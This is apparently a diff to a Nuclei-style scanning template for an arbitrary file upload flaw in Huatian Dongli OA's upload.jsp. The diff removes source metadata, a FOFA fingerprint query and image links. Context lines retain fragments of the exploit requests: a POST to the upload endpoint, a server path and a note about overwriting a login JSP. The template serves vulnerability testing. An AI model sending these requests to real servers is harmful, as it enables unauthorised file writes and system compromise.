@@ -3,12 +3,8 @@ info:
   name: 华天动力OA系统upload.jsp任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tntgnxc43y1ddhkq'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tntgnxc43y1ddhkq
-    fofa: body="/OAapp/WebObjects/OAapp.woa" || body="/OAapp/htpages/app"
 http:
 - raw:
   - 'POST /OAapp/jsp/upload.jsp HTTP/1.1
@@ -40,7 +36,6 @@ http:
 
     ------WebKitFormBoundary5Ur8laykKAWws2QO--
 
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1733741898627-5cbe8e7d-b848-4236-b227-5c910edca801.png)
 
     将“123”写入到normalLoginPageForOther.jsp文件中去'
   redirects: false
@@ -76,12 +71,7 @@ http:
 
     D:/htoa/Tomcat/webapps/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp
 
-    ------WebKitFormBoundaryzRSYXfFlXqk6btQm--
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1733741898922-a701003d-d469-4393-a706-54a5b94f9b1c.png)
-
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1733741899155-1a98b374-f32b-4eda-8935-a4e30e3f27ba.png)'
+    ------WebKitFormBoundaryzRSYXfFlXqk6btQm--'
   redirects: false
   matchers:
   - status:
